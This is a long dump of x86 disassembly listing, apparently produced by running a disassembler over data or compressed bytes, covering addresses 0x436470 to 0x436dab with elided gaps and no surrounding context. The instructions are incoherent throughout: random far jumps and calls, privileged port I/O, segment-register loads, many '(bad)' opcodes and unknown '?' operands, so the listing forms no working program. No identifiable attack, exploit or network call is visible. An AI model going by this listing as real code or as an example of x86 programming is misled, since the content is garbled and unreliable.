  436470:	cmp    DWORD PTR [esi-0x59],ecx
  436473:	mov    edi,DWORD PTR [ebp+0x0]
	...
  43648e:	sbb    esi,edi
  436490:	xchg   esp,eax
  436491:	shl    BYTE PTR [ebp+eax*2-0x4],0xe8
  436496:	and    BYTE PTR [ebx-0x5],dh
  436499:	push   esp
  43649b:	pop    ss
  43649c:	mov    edi,0xfa826573
  4364a1:	addr16 js 0x4364d4
  4364a4:	aas    
  4364a5:	add    BYTE PTR [ebp+esi*8-0x2],bl
  4364a9:	push   esp
  4364ab:	scas   al,BYTE PTR es:[edi]
  4364ac:	jmp    0x436495
  4364ae:	sub    edx,DWORD PTR [esi+0x5c78fab3]
  4364b4:	das    
  4364b5:	push   esi
  4364b6:	push   ds
  4364b7:	lods   al,BYTE PTR ds:[esi]
  4364b8:	mov    bl,0x6e
  4364ba:	lock inc ebx
  4364bc:	int3   
  4364bd:	call   FWORD PTR [ebx-0x63ce4c64]
  4364c3:	add    dh,BYTE PTR [edx-0x3bdf7407]
  4364c9:	jae    0x436504
  4364cb:	inc    edx
  4364cc:	add    BYTE PTR [ebp+0x68535831],cl
  4364d2:	ds pushf 
  4364d4:	(bad)  
  4364d5:	jmp    FWORD PTR [ebx-0x32]
  4364d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4364d9:	and    esp,DWORD PTR [edx-0x72]
  4364dc:	mov    ah,0x83
  4364de:	xor    al,0x10
  4364e0:	in     eax,0x8c
  4364e2:	jns    0x436538
  4364e4:	mov    dl,0xfa
  4364e6:	dec    ebx
  4364e7:	or     al,0xb5
  4364e9:	adc    al,0x38
  4364eb:	retf   0x3e
  4364ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4364ef:	dec    eax
  4364f0:	jnp    0x436499
	...
  43650a:	add    BYTE PTR [edx],dh
  43650c:	pop    ds
  43650d:	mov    ch,0x4f
  43650f:	pushf  
  436510:	repnz add eax,DWORD PTR [eax]
  436513:	hlt    
  436514:	dec    esi
  436515:	jmp    0x78fa:0xb2391be7
  43651c:	fsubr  QWORD PTR [edi]
  43651e:	push   es
  43651f:	jg     0x436582
  436521:	push   cs
  436522:	ret    0x9cf4
  436525:	outs   dx,BYTE PTR ds:[esi]
  436526:	add    BYTE PTR [edi],cl
  436528:	rol    DWORD PTR [edi+0x1b047931],1
  43652e:	xor    cl,bh
  436530:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  436531:	shr    BYTE PTR [ebx-0x4aee2b98],cl
  436537:	inc    ebp
  436538:	popf   
  436539:	jns    0x43650d
  43653b:	into   
  43653c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43653d:	mov    dh,0xc3
  43653f:	cs inc edi
  436541:	sahf   
  436542:	retf   0xf881
  436545:	call   0x91f6d897
  43654a:	mov    BYTE PTR ds:0x73fdaa01,ch
  436550:	js     0x43657a
  436552:	add    al,0x79
  436554:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  436555:	pop    esp
  436556:	pop    es
  436557:	lahf   
  436558:	in     eax,dx
  436559:	rol    BYTE PTR [ebp-0x5b],0xa5
  43655d:	ror    DWORD PTR [esp+ebx*4+0x3c],0x98
  436562:	mov    ah,0x7e
  436564:	scas   al,BYTE PTR es:[edi]
  436565:	sub    al,0xe0
  436567:	out    dx,eax
  436568:	add    esp,DWORD PTR [edx+0x29312ffd]
  43656e:	add    al,0x0
	...
  436588:	loopne 0x436588
  43658a:	xor    ch,BYTE PTR [eax+ebp*1-0x414b6e2c]
  436591:	jns    0x436535
  436593:	push   ebp
  436594:	xchg   edx,eax
  436595:	add    cl,ch
  436597:	jnp    0x436605
  436599:	popa   
  43659a:	popa   
  43659b:	add    BYTE PTR [edx-0x4558a1b1],0xa0
  4365a2:	jo     0x436524
  4365a4:	pop    ds
  4365a5:	and    BYTE PTR [esi+0x5f79c74d],dh
  4365ab:	lock arpl WORD PTR [edi-0x24],si
  4365af:	(bad)  
  4365b1:	jnp    0x43657f
  4365b3:	(bad)  
  4365b5:	pushf  
  4365b6:	inc    esi
  4365b7:	sub    al,0xe
  4365b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4365ba:	ins    DWORD PTR es:[edi],dx
  4365bb:	sub    al,0xf8
  4365bd:	ja     0x4365be
  4365bf:	lods   al,BYTE PTR ds:[esi]
  4365c0:	sbb    ecx,DWORD PTR [ecx]
  4365c2:	mov    DWORD PTR [ebp+0x292ee0d3],esp
  4365c8:	in     al,0xbb
  4365ca:	ret    0xc3a5
  4365cd:	add    BYTE PTR [ebp+eiz*2-0x5a3cfac9],dl
  4365d4:	mov    bl,0xf0
  4365d6:	lahf   
  4365d7:	jg     0x436610
  4365d9:	add    eax,0xe9037062
  4365de:	adc    esp,DWORD PTR [eax+0x23]
  4365e1:	jmp    0xa45d65fd
  4365e6:	cli    
  4365e7:	jmp    0xf94f855e
	...
  436604:	add    dh,dh
  436606:	xchg   BYTE PTR [ebp+0x5204f7e9],dl
  43660c:	bound  ecx,QWORD PTR [edi-0x54]
  43660f:	pop    edx
  436610:	mov    DWORD PTR [esi-0x61],0xbb6da186
  436617:	or     ch,BYTE PTR [ebp+0x6e]
  43661a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43661b:	cli    
  43661c:	jmp    0xb74d12eb
  436621:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  436622:	lahf   
  436623:	jle    0x436652
  436625:	dec    esp
  436626:	call   0x481c7625
  43662b:	and    al,0xc9
  43662d:	sar    BYTE PTR [edi],1
  43662f:	and    al,0xd1
  436631:	sbb    eax,0x9cf4bf8a
  436636:	mov    eax,DWORD PTR [edx-0x1b]
  436639:	je     0x436686
  43663b:	adc    BYTE PTR [eax],bl
  43663d:	jnp    0x4365eb
  43663f:	psrlw  mm1,QWORD PTR [eax+0x7fe8ffa1]
  436646:	ins    DWORD PTR es:[edi],dx
  436647:	mov    cl,0x56
  436649:	addr16 mov ebp,edi
  43664c:	fs dec esi
  43664e:	sbb    DWORD PTR [eax+eax*1],ecx
  436651:	jne    0x4365db
  436653:	cli    
  436654:	dec    DWORD PTR ds:0xe94488ee
  43665a:	test   al,0xe1
  43665c:	das    
  43665d:	push   eax
  43665e:	dec    ebp
  43665f:	and    al,0x24
  436661:	lods   eax,DWORD PTR ds:[esi]
  436662:	test   BYTE PTR [esi],bh
  436664:	and    al,0xf5
  436666:	cmp    BYTE PTR [ebx+0xc6],al
	...
  436680:	add    BYTE PTR [eax],al
  436682:	cmc    
  436683:	xor    dl,al
  436685:	inc    DWORD PTR [edx]
  436687:	aas    
  436688:	pop    esi
  436689:	mov    DWORD PTR [ecx+0x7ae81eab],ebx
  43668f:	mov    bh,0xf5
  436691:	call   DWORD PTR [esi+0x45]
  436694:	and    al,0x18
  436696:	sbb    BYTE PTR [edx+0x6e],ah
  436699:	or     esp,DWORD PTR [esi]
  43669b:	or     DWORD PTR [edx+0x1],esp
  43669e:	ret    0x7af7
  4366a1:	fs jmp 0x9dad66b7
  4366a7:	add    DWORD PTR [ecx],eax
  4366a9:	(bad)  
  4366aa:	fldcw  WORD PTR [edx+eax*2+0x23dc1050]
  4366b1:	cmp    BYTE PTR [ebp-0x5d016f9c],dh
  4366b7:	cmp    ch,al
  4366b9:	cmp    al,0xad
  4366bb:	push   esi
  4366bc:	cmc    
  4366bd:	xor    esi,DWORD PTR [esi]
  4366bf:	and    bh,BYTE PTR [edi]
  4366c1:	and    al,0x51
  4366c3:	and    ch,BYTE PTR [ebx+0x4]
  4366c6:	(bad)  
  4366c7:	into   
  4366c8:	or     esi,0xfefd5365
  4366ce:	ret    0xf322
  4366d1:	cmp    eax,esi
  4366d3:	push   es
  4366d4:	test   DWORD PTR [edx-0x5e],eax
  4366d7:	push   esi
  4366d8:	cmc    
  4366d9:	neg    BYTE PTR [ecx-0x55]
  4366dc:	push   cs
  4366dd:	adc    BYTE PTR [ecx+0x50],cl
  4366e0:	lea    eax,[esp+esi*8+0x11]
  4366e4:	add    BYTE PTR [eax+0x0],dl
	...
  4366ff:	jge    0x436772
  436701:	loop   0x436712
  436703:	sbb    al,0x75
  436705:	lods   eax,DWORD PTR ds:[esi]
  436706:	cld    
  436707:	add    ebp,DWORD PTR [ecx]
  436709:	mov    edi,0xe545b873
  43670e:	(bad)  
  43670f:	icebp  
  436710:	repz add edi,0x24431514
  436717:	add    al,0x31
  436719:	inc    ebx
  43671a:	and    al,0x4
  43671c:	pop    esp
  43671d:	sbb    al,0x1
  43671f:	pop    esi
  436720:	test   al,0x46
  436722:	call   0xfaf413bf
  436727:	ret    
  436728:	sbb    bl,ah
  43672a:	or     ecx,esp
  43672c:	iret   
  43672d:	call   0xca20:0x2fb3fc
  436734:	out    dx,eax
  436735:	add    edx,DWORD PTR [eax]
  436737:	or     al,0xac
  436739:	(bad)  
  43673a:	push   DWORD PTR [esi+eax*2+0x18]
  43673e:	mov    DWORD PTR [eax],esi
  436740:	or     BYTE PTR [eax],bl
  436742:	sti    
  436743:	loope  0x436730
  436745:	pop    ss
  436746:	inc    eax
  436747:	hlt    
  436748:	xor    BYTE PTR [eax],bh
  43674a:	and    al,0xe8
  43674c:	ret    
  43674d:	inc    eax
  43674e:	sti    
  43674f:	jno    0x4367c4
  436751:	pushf  
  436752:	dec    esp
  436753:	(bad)  
  436754:	lock out 0x13,eax
  436757:	in     al,dx
  436758:	test   DWORD PTR [edx],0xb09ee3e8
  43675e:	cli    
  43675f:	dec    edx
  436760:	call   0x437b4c
	...
  436779:	add    BYTE PTR [eax],al
  43677b:	add    bh,dh
  43677d:	lahf   
  43677e:	call   0x445a9bea
  436783:	add    BYTE PTR [ebp+eiz*4+0x21],cl
  436787:	sti    
  436788:	xor    esp,DWORD PTR [edi]
  43678a:	dec    eax
  43678b:	and    al,0x0
  43678d:	add    eax,0x4f403d1
  436792:	imul   edx,ebx,0x3488613
  436798:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  436799:	cs call 0x427922f3
  43679f:	pop    ss
  4367a0:	cwde   
  4367a1:	hlt    
  4367a2:	test   al,0x3
  4367a4:	adc    edi,ecx
  4367a6:	cmp    cl,BYTE PTR [eax+0x18]
  4367a9:	stc    
  4367aa:	in     al,0x37
  4367ac:	stc    
  4367ad:	sub    al,0xe9
  4367af:	add    esi,esp
  4367b1:	test   BYTE PTR [esi-0x570820e9],cl
  4367b7:	pop    ss
  4367b8:	xor    al,0x5
  4367ba:	pop    esi
  4367bb:	inc    eax
  4367bc:	adc    ch,bh
  4367be:	mov    ebp,0x6e0f47bc
  4367c3:	add    edx,DWORD PTR [edx+0x4]
  4367c6:	repnz adc edi,DWORD PTR [ebp+0x40]
  4367ca:	lds    ecx,FWORD PTR [ebx]
  4367cc:	jns    0x436816
  4367ce:	or     eax,0x24ca444c
  4367d3:	call   0x449e3ca3
  4367d8:	hlt    
  4367d9:	leave  
  4367da:	and    al,0xe8
  4367dc:	jmp    0x43684e
  4367de:	xor    eax,0x44
	...
  4367f7:	add    BYTE PTR [eax],al
  4367f9:	hlt    
  4367fa:	mov    eax,ds:0x44ea17d3
  4367ff:	jmp    0x5e813654
  436804:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  436805:	enter  0x9ac5,0x47
  436809:	sbb    BYTE PTR [ecx],cl
  43680b:	call   0xa9d6db69
  436810:	or     DWORD PTR [eax-0x3ffbd6eb],esp
  436816:	or     bl,BYTE PTR [ebx]
  436818:	pushf  
  436819:	or     al,0xd2
  43681b:	jns    0x4367cd
  43681d:	jb     0x4367e9
  43681f:	call   DWORD PTR [esi]
  436821:	cmp    al,BYTE PTR ds:0x89ce1a00
  436827:	out    dx,eax
  436828:	mov    esi,0x2f866128
  43682d:	and    BYTE PTR [edx-0x1d90a9d2],bh
  436833:	sti    
  436834:	dec    edi
  436835:	inc    esp
  436836:	fidivr DWORD PTR [esi-0x36761843]
  43683c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43683d:	pop    edi
  43683e:	(bad)  
  43683f:	sti    
  436840:	aaa    
  436841:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  436842:	xlat   BYTE PTR ds:[ebx]
  436843:	mov    esi,0xf6d7a3b4
  436848:	pushf  
  436849:	sti    
  43684a:	push   esp
  43684b:	add    BYTE PTR [edx],dl
  43684d:	or     cl,BYTE PTR [eax-0x6f8e9ff]
  436853:	dec    edi
  436854:	add    DWORD PTR [ebx],edi
  436856:	int3   
  436857:	cli    
  436858:	push   es
  436859:	inc    eax
  43685a:	mov    al,0x36
  43685c:	cli    
	...
  436875:	add    BYTE PTR [edx],al
  436877:	in     al,0x65
  436879:	in     eax,dx
  43687a:	pop    ebp
  43687c:	leave  
  43687d:	out    dx,al
  43687e:	pop    ebx
  43687f:	xlat   BYTE PTR ds:[ebx]
  436880:	mov    esi,0x178dec5d
  436885:	shl    dh,cl
  436887:	out    dx,eax
  436888:	mov    edi,0x214b712
  43688d:	pusha  
  43688e:	add    BYTE PTR [edi+0x3680d2f7],0xe8
  436895:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  436896:	cmp    bl,BYTE PTR [ebx-0x285d0506]
  43689c:	div    BYTE PTR [esp+edi*8]
  43689f:	out    dx,al
  4368a0:	mov    edi,0x826b992
  4368a5:	xchg   ecx,eax
  4368a6:	or     dh,0xfa
  4368a9:	xchg   esi,eax
  4368aa:	pop    edi
  4368ab:	pop    edi
  4368ac:	jae    0x436890
  4368ae:	xor    ah,BYTE PTR [eax+0x48c90082]
  4368b4:	add    BYTE PTR [ecx+0x2e30cf5],cl
  4368ba:	outs   dx,BYTE PTR ds:[esi]
  4368bb:	les    esi,FWORD PTR [ecx]
  4368bd:	ret    
  4368be:	and    BYTE PTR [edi-0x753ac80b],bl
  4368c4:	enter  0xbaff,0x37
  4368c8:	call   0xf5b34461
  4368cd:	jmp    0x43689b
  4368cf:	sbb    ebp,ebx
  4368d1:	call   0x397a14
  4368d6:	test   bl,0x6e
  4368d9:	or     DWORD PTR [eax],eax
	...
  4368f3:	lea    edx,[edx]
  4368f5:	add    bh,bh
  4368f7:	rol    BYTE PTR [edi],0xb
  4368fa:	inc    eax
  4368fb:	int    0x1d
  4368fd:	mov    edx,0xbb4a9b5f
  436902:	mov    al,0xdc
  436904:	lds    ecx,FWORD PTR [edx]
  436906:	add    bl,ah
  436908:	dec    esp
  436909:	and    al,0x4
  43690b:	int3   
  43690c:	cmp    DWORD PTR [ebx-0x5bf8ed0f],eax
  436912:	mov    WORD PTR [ebp+0x3],ds
  436915:	je     0x43691d
  436917:	cmp    DWORD PTR [ebx+0x5b],0xffffffce
  43691b:	call   0xfec2:0xdbc6816e
  436922:	call   DWORD PTR [esi]
  436924:	cmp    bh,BYTE PTR [ebp+eax*4+0x4f]
  436928:	xlat   BYTE PTR ds:[ebx]
  436929:	pop    ss
  43692a:	mov    edx,ebx
  43692c:	add    BYTE PTR [ebx+0x5033314e],al
  436932:	push   ecx
  436933:	xor    eax,0x9afe8927
  436938:	stos   BYTE PTR es:[edi],al
  436939:	inc    eax
  43693a:	push   0x296f0e01
  43693f:	in     al,0x49
  436941:	push   0x7f2ff48b
  436946:	dec    DWORD PTR [ebx-0x53]
  436949:	xchg   DWORD PTR [edi-0x768a5b38],edi
  43694f:	jo     0x4368fe
  436951:	(bad)  
  436952:	dec    ebx
  436954:	cld    
  436955:	cmp    BYTE PTR [ecx+0x0],0x0
	...
  43696d:	add    BYTE PTR [eax],al
  43696f:	add    BYTE PTR [eax-0x78d5503],dl
  436975:	xor    eax,0x3e1a6f4c
  43697a:	dec    edx
  43697b:	test   DWORD PTR [ecx+eax*8],esi
  43697e:	std    
  43697f:	scas   eax,DWORD PTR es:[edi]
  436980:	cmc    
  436981:	jmp    0xeb75:0x8037bff0
  436988:	outs   dx,DWORD PTR ds:[esi]
  436989:	push   0xdd7f51f6
  43698e:	in     eax,0x41
  436990:	dec    esp
  436991:	pop    eax
  436992:	adc    BYTE PTR [edi-0x8a5fc7],al
  436998:	hlt    
  436999:	and    eax,0xacd3ff77
  43699e:	outs   dx,BYTE PTR ds:[esi]
  43699f:	add    ch,bl
  4369a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4369a2:	add    eax,DWORD PTR [eax]
  4369a4:	hlt    
  4369a5:	sub    ch,BYTE PTR ds:0xae17f474
  4369ab:	xchg   BYTE PTR [ecx],bh
  4369ad:	ror    BYTE PTR [ebp-0x79],0xc
  4369b1:	ja     0x436a28
  4369b3:	jl     0x4369b9
  4369b5:	adc    eax,0x558d082b
  4369ba:	add    eax,DWORD PTR [eax]
  4369bc:	hlt    
  4369bd:	fisubr DWORD PTR [esp+esi*2+0x384240fc]
  4369c4:	and    al,0x19
  4369c6:	inc    edx
  4369c7:	sbb    BYTE PTR [edx+edi*8-0x528c0662],cl
  4369ce:	inc    ecx
  4369cf:	or     BYTE PTR [edi],bl
  4369d1:	je     0x436a48
  4369d3:	inc    ecx
	...
  4369ec:	add    BYTE PTR [ebx],dl
  4369ee:	add    eax,0xce02ccd
  4369f3:	fisttp QWORD PTR [eax]
  4369f5:	inc    DWORD PTR [edi+0x4f404b6]
  4369fb:	gs (bad) 
  4369fd:	out    dx,al
  4369fe:	mov    BYTE PTR [ebx+0x4],ah
  436a01:	hlt    
  436a02:	add    al,0x6e
  436a04:	inc    esi
  436a05:	test   al,0x4c
  436a07:	and    DWORD PTR [eax],edi
  436a09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  436a0a:	dec    esp
  436a0b:	and    ebp,edi
  436a0d:	js     0x436998
  436a0f:	call   0xa31f5e17
  436a14:	sbb    edi,edi
  436a16:	mov    BYTE PTR [esi-0x49fb0bfc],dl
  436a1c:	lods   al,BYTE PTR ds:[esi]
  436a1d:	mov    BYTE PTR [edx+ebx*4],cl
  436a20:	lods   al,BYTE PTR ds:[esi]
  436a21:	loopne 0x436a73
  436a23:	rol    DWORD PTR [ebx-0xc],cl
  436a26:	mov    DWORD PTR [ebx-0x233694e9],ebp
  436a2c:	jp     0x436a39
  436a2e:	mov    WORD PTR [ebx+0x19e3d3fb],fs
  436a34:	lods   eax,DWORD PTR ds:[esi]
  436a35:	into   
  436a36:	mov    BYTE PTR [eax],ch
  436a38:	std    
  436a39:	ja     0x4369c8
  436a3b:	call   0xe86e5e43
  436a40:	jle    0x436a7f
  436a42:	sub    DWORD PTR [ecx-0x16bb809d],edx
  436a48:	lods   al,BYTE PTR ds:[esi]
  436a49:	or     DWORD PTR es:[ecx],eax
  436a4c:	(bad)  
  436a4d:	adc    DWORD PTR [edi+0x86e1],ebx
	...
  436a67:	add    BYTE PTR [eax],al
  436a69:	add    BYTE PTR [ebx+0x18],bl
  436a6c:	pusha  
  436a6d:	lods   eax,DWORD PTR ds:[esi]
  436a6e:	add    eax,0x1c455e25
  436a73:	sahf   
  436a74:	push   edx
  436a75:	push   eax
  436a76:	jnp    0x436a6d
  436a78:	ins    DWORD PTR es:[edi],dx
  436a79:	ds call 0x6f6d122b
  436a7f:	popf   
  436a80:	jmp    FWORD PTR [edi+esi*1+0x11]
  436a84:	pop    esi
  436a85:	push   0x18
  436a87:	or     DWORD PTR [eax],eax
  436a89:	jb     0x436a95
  436a8b:	cmc    
  436a8c:	ret    0xc27
  436a8f:	or     BYTE PTR [eax],al
  436a91:	jmp    0x625a108d
  436a96:	mov    ecx,0x3ae271c
  436a9b:	stc    
  436a9c:	cli    
  436a9d:	not    edi
  436a9f:	test   DWORD PTR [ebp+eiz*8+0x58],ecx
  436aa3:	adc    ebx,DWORD PTR [edx+eiz*2+0x48]
  436aa7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  436aa8:	xchg   ecx,eax
  436aa9:	jecxz  0x436af3
  436aab:	call   0xe965:0xd1cb2983
  436ab2:	mov    cl,BYTE PTR [ebx+0x18]
  436ab5:	inc    ecx
  436ab6:	mov    ch,0x98
  436ab8:	stc    
  436ab9:	inc    esi
  436aba:	jb     0x436a72
  436abc:	or     ah,BYTE PTR [eax+edx*8-0x61]
  436ac0:	cli    
  436ac1:	ss ins BYTE PTR es:[edi],dx
  436ac3:	inc    esi
  436ac4:	je     0x436b30
  436ac6:	pop    DWORD PTR ds:0x9474f37a
  436acc:	add    al,0x9c
	...
  436ae6:	add    dl,bh
  436ae8:	add    DWORD PTR [ebp+edi*8-0x2a],0xfffffff4
  436aed:	mov    bh,0x49
  436aef:	lock add al,0x0
  436af2:	ret    0x2d31
  436af5:	push   ss
  436af6:	sub    DWORD PTR [ecx+0x5c],esp
  436af9:	pop    edx
  436afa:	xchg   edx,eax
  436afb:	cmp    DWORD PTR [edx],edi
  436afd:	mov    esi,0xbfeaf7d9
  436b02:	shl    BYTE PTR [ebp-0x15],cl
  436b05:	mov    edi,0x6c451129
  436b0a:	stos   BYTE PTR es:[edi],al
  436b0b:	es test al,dh
  436b0e:	push   0xffffffce
  436b10:	sub    bh,bh
  436b12:	(bad)  
  436b13:	mov    eax,0x5f6a4f0c
  436b18:	sbb    eax,0x34b55c79
  436b1d:	jns    0x436b5f
  436b1f:	dec    ebp
  436b20:	outs   dx,DWORD PTR ds:[esi]
  436b21:	ins    DWORD PTR es:[edi],dx
  436b22:	add    al,0x85
  436b24:	push   0x6f
  436b26:	(bad)  
  436b27:	jb     0x436b79
  436b29:	test   eax,eax
  436b2b:	call   0x14039534
  436b30:	les    esp,FWORD PTR [ecx+eax*1-0x40]
  436b34:	fimul  WORD PTR [edi]
  436b36:	(bad)  
  436b37:	(bad)  
  436b39:	add    eax,DWORD PTR [eax]
  436b3b:	sbb    eax,0x9ed4e808
  436b40:	outs   dx,BYTE PTR ds:[esi]
  436b41:	cmc    
  436b42:	mov    al,0xc
  436b44:	dec    esi
  436b45:	mov    ebx,0x81518656
  436b4a:	inc    esi
	...
  436b63:	add    BYTE PTR [ecx],dh
  436b65:	loopne 0x436bb5
  436b67:	je     0x436b63
  436b69:	fadd   DWORD PTR [edi+0x75]
  436b6c:	idiv   dl
  436b6e:	stc    
  436b6f:	mov    WORD PTR [ebx-0x5bab97bd],?
  436b75:	inc    edi
  436b76:	add    bh,bh
  436b78:	stos   BYTE PTR es:[edi],al
  436b79:	fwait
  436b7a:	loop   0x436b37
  436b7c:	jl     0x436beb
  436b7e:	cmc    
  436b7f:	test   DWORD PTR ds:0x1d3203d6,ebx
  436b85:	jl     0x436bbb
  436b87:	(bad)  
  436b88:	fwait
  436b89:	repz stc 
  436b8b:	dec    ebp
  436b8d:	pop    es
  436b8e:	jecxz  0x436ba8
  436b90:	es inc ebp
  436b92:	and    al,0xc
  436b94:	ja     0x436b96
  436b96:	lea    ecx,[esi-0x43]
  436b99:	sbb    BYTE PTR [ecx+0x70],al
  436b9c:	dec    edx
  436b9d:	inc    ebp
  436b9e:	ins    BYTE PTR es:[edi],dx
  436b9f:	add    bl,BYTE PTR [ebp-0xb17fff9]
  436ba5:	sub    dh,BYTE PTR [edx+0x2aca83f9]
  436bab:	and    al,0xe4
  436bad:	adc    BYTE PTR [ecx],ch
  436baf:	pop    esp
  436bb0:	jae    0x436b83
  436bb2:	fisttp WORD PTR [edi]
  436bb4:	imul   ebx,edx,0xffffffff
  436bb7:	out    0xe3,eax
  436bb9:	fsub   QWORD PTR [ebp+0x9c563fa]
  436bbf:	ror    BYTE PTR [ebx-0x3b],0x45
  436bc3:	pop    edx
  436bc4:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  436bc6:	(bad)  
  436bc7:	push   ecx
	...
  436be0:	add    BYTE PTR [edi+0x7c],ch
  436be3:	jns    0x436c26
  436be5:	enter  0x3bd5,0x53
  436be9:	test   eax,0x78fe1ccc
  436bee:	xchg   ebx,eax
  436bef:	inc    edx
  436bf0:	push   0x3e94bc
  436bf5:	sbb    edi,DWORD PTR [edx-0x43541806]
  436bfb:	test   al,0xfa
  436bfd:	jno    0x436bec
  436bff:	das    
  436c00:	add    al,0xc6
  436c02:	in     eax,dx
  436c03:	cdq    
  436c04:	pop    ds
  436c05:	xor    ebp,DWORD PTR [ebx+0x12]
  436c08:	push   ebx
  436c0a:	lods   al,BYTE PTR ds:[esi]
  436c0b:	(bad)  
  436c0c:	cli    
  436c0d:	pusha  
  436c0e:	or     BYTE PTR [ecx*4+0x73a58862],dl
  436c15:	adc    BYTE PTR [ebp+eiz*4-0x100c078e],bl
  436c1c:	jo     0x436be8
  436c1e:	rep lods eax,DWORD PTR ds:[esi]
  436c20:	xlat   BYTE PTR ds:[ebx]
  436c21:	fucomip st,st(3)
  436c23:	lods   eax,DWORD PTR ds:[esi]
  436c24:	xlat   BYTE PTR ds:[ebx]
  436c25:	sbb    esp,DWORD PTR [edx-0x3c]
  436c28:	pop    es
  436c29:	hlt    
  436c2a:	jl     0x436c7d
  436c2c:	push   ebx
  436c2d:	jns    0x436c41
  436c2f:	imul   DWORD PTR [esi]
  436c31:	mov    ah,0xe3
  436c33:	add    BYTE PTR [eax+ebp*2-0x63fbd6fb],ah
  436c3a:	clc    
  436c3b:	jo     0x436be6
  436c3d:	mov    cs,WORD PTR [esi-0x2a181fd4]
  436c43:	lods   eax,DWORD PTR ds:[esi]
  436c44:	rol    DWORD PTR [eax],0x0
	...
  436c5b:	add    BYTE PTR [eax],al
  436c5d:	add    ch,dh
  436c5f:	push   0xc1f44474
  436c64:	loope  0x436cd5
  436c66:	jg     0x436cad
  436c68:	jmp    0x606429e7
  436c6d:	dec    edx
  436c6e:	int3   
  436c6f:	mov    eax,DWORD PTR [edx+0x18]
  436c72:	aaa    
  436c73:	inc    ebx
  436c74:	sbb    DWORD PTR [eax+esi*8],eax
  436c77:	add    al,0xe9
  436c79:	sbb    eax,0x4c228bf9
  436c7e:	pushf  
  436c7f:	mov    ebp,DWORD PTR [edx]
  436c81:	xor    BYTE PTR [ebp+0x3b],bh
  436c84:	std    
  436c85:	jp     0x436c14
  436c87:	test   eax,ebp
  436c89:	add    esi,esp
  436c8b:	mov    ecx,DWORD PTR [edx-0x80]
  436c8e:	sbb    ebx,DWORD PTR [edx-0x72928518]
  436c94:	call   0xb51f609c
  436c99:	fcomip st,st(3)
  436c9b:	adc    al,dh
  436c9d:	push   ebx
  436c9e:	call   DWORD PTR [eax]
  436ca0:	or     eax,0xf9418110
  436ca5:	push   ebx
  436ca6:	jns    0x436ce9
  436ca8:	fstp   DWORD PTR [ebx-0x56d54611]
  436cae:	pop    edx
  436caf:	popf   
  436cb0:	jmp    0x436ce1
  436cb2:	ror    DWORD PTR [edx+edi*4+0x2a8e2f2f],cl
  436cb9:	dec    ebp
  436cba:	sbb    eax,0x2603e0c7
  436cbf:	mov    ?,edi
  436cc1:	fwait
	...
  436cda:	add    BYTE PTR [edx],al
  436cdc:	add    eax,0x40a603e9
  436ce1:	add    ch,cl
  436ce3:	lahf   
  436ce4:	add    al,0x74
  436ce6:	out    0x45,eax
  436ce8:	lods   eax,DWORD PTR ds:[esi]
  436ce9:	pop    ebx
  436cea:	mov    dl,0x5c
  436cec:	sahf   
  436ced:	xchg   BYTE PTR [edi-0x16fca4c3],ah
  436cf3:	dec    esp
  436cf4:	push   ebx
  436cf5:	jg     0x436ce0
  436cf7:	test   DWORD PTR [ebx+eax*8],0x3f8dcbef
  436cfe:	jmp    0x7d4bb037
  436d03:	jmp    0x436cde
  436d05:	inc    eax
  436d07:	dec    ebp
  436d08:	ret    0xa6fa
  436d0b:	pushf  
  436d0c:	adc    esp,DWORD PTR [ecx+edx*4+0x45]
  436d10:	ret    0x96fa
  436d13:	xor    al,0x43
  436d15:	or     BYTE PTR [ecx-0x52002647],cl
  436d1b:	cmc    
  436d1c:	pusha  
  436d1d:	mov    ebp,DWORD PTR [ecx]
  436d1f:	lock pop ecx
  436d21:	push   esp
  436d22:	bound  ecx,QWORD PTR [ebx-0x1d9daecc]
  436d28:	or     BYTE PTR [edi-0x41],cl
  436d2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  436d2c:	lods   al,BYTE PTR ds:[esi]
  436d2d:	pusha  
  436d2e:	jp     0x436d8c
  436d30:	sahf   
  436d31:	xchg   BYTE PTR [edi+eiz*8-0x359f107f],ah
  436d38:	cwde   
  436d39:	out    0x9d,eax
  436d3b:	mov    BYTE PTR [ebx+0x72fa],bl
	...
  436d55:	add    BYTE PTR [eax],al
  436d57:	add    BYTE PTR [edx],dl
  436d59:	or     eax,0x818fac89
  436d5e:	icebp  
  436d5f:	mov    ch,0x28
  436d61:	mov    al,BYTE PTR [ebx-0x27]
  436d64:	ror    BYTE PTR [ecx+0x4f7699a],cl
  436d6a:	add    BYTE PTR [ecx-0x641858c0],bh
  436d70:	jns    0x436d0d
  436d72:	cli    
  436d73:	add    BYTE PTR [ecx],ah
  436d75:	les    ebp,FWORD PTR [esi+0x45]
  436d78:	stos   BYTE PTR es:[edi],al
  436d79:	jmp    0xc73:0x6d668bfb
  436d80:	push   ss
  436d81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  436d82:	inc    esi
  436d83:	push   ss
  436d84:	fld    QWORD PTR [eax]
  436d86:	dec    edi
  436d87:	inc    DWORD PTR [ebx+0x4]
  436d8a:	jge    0x436d88
  436d8c:	stos   BYTE PTR es:[edi],al
  436d8d:	(bad)  
  436d8e:	mul    DWORD PTR [esi+0x52]
  436d91:	cwde   
  436d92:	xor    al,0x20
  436d94:	cmp    dl,dh
  436d96:	jae    0xff92712e
  436d9c:	add    DWORD PTR [edi*2+0x845d6f8],0x66
  436da4:	mov    ds:0xde0a0b98,al
  436da9:	les    edx,FWORD PTR [edx]
  436dab:	adc    DWORD PTR [edx+0x4d07be03],0xffffffbb
